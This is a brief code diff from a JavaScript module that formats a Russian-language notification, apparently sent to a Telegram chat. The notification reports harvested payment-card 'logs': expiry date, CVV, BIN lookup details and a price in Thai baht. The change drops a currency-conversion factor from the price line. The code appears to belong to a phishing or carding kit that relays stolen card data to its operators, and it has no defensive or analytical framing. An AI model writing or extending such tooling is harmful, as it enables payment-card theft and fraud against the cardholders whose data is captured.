@@ -7,5 +7,5 @@ module.exports = async (log) => {
 📅 <b>Срок действия:</b> <code>${log.cardExp}</code>
 🔒 <b>CVV:</b> <code>${log.cardCvv}</code>
     ${await binInfoEdit(log.cardNumber.replace(/\s/g, ""))}
-💰 <b>Стоимость:</b> ${log.price == null ? '[Не указана]' : `${Math.round(log.price * 37.42)} THB`}`;
+💰 <b>Стоимость:</b> ${log.price == null ? '[Не указана]' : `${log.price} THB`}`;
 };
